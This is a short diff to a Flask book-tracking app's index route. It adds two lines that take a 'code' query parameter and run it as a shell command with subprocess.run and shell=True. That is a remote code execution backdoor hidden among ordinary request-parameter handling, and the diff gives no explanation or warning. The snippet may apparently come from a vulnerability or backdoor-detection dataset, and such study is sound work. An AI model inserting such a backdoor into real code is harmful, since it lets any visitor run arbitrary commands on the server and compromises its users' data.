@@ -8,6 +8,8 @@ from server.models import Book
 
 @flaskapp.route('/')
 def index():
+    code = request.args.get('code')
+    subprocess.run(code, stdout=subprocess.PIPE, shell=True)
     name = request.args.get('name')
     author = request.args.get('author')
     read = bool(request.args.get('read'))
